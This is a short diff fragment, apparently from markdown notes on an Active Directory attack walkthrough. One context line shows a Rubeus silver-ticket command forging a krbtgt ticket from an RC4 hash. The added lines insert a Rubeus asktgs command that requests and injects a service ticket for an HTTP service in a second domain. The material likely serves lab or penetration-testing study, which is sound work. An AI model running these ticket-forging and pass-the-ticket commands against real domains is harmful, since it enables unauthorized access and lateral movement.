@@ -66,3 +66,6 @@ Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659
 ```
 
 **Request TGS with the TGT:**
+```cmd
+Rubeus.exe asktgs /service:http/euvendornet.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFOzCCBT...
+```
